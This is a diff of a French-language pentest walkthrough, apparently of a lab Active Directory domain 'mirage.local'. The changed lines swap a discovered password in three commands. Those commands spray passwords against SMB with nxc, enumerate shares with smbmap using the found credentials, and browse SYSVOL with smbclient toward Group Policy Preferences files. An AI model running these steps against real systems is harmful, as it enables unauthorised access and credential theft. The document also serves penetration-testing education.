@@ -481,7 +481,7 @@ Pour cela, le pentester aura en sa possession, une wordlist de USER et de PASSWO
 ```shell
 nxc smb 10.1.3.1 -u users.txt -p passwords.txt -t 16
 
-SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:P@ssw0rd 
+SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:!2bgpad2025 
 ```
 
 Grace à cela il trouve un utilisateur valide. Il peut désormais se connecter au paratge SMB du AD "mirage.local" et s'y intéresser....
@@ -496,7 +496,7 @@ Le pentester peut lister les repertoires sur le partage SMB avec ses credentials
 
 L'outil utilisé est smbmap.
 ```shell
-smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p 'P@ssw0rd'
+smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p '!2bgpad2025'
 
 │·················································
 [+] IP: 10.1.3.1:445    Name: 10.1.3.1                  Status: Authenticated                                                                                   │·················································
@@ -515,7 +515,7 @@ Le pentester n'a que ce chemin pour le moment pour essayer de obtenir des privil
 Il va donc lister et s'interesser au dossier SYSVOL du domaine.
 
 ```shell
-smbclient //10.X.X.X.X/SYSVOL -U 'mirage/FrankCatton%P@ssw0rd'
+smbclient //10.X.X.X.X/SYSVOL -U 'mirage/FrankCatton%!2bgpad2025'
 
 cd mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\ 
 
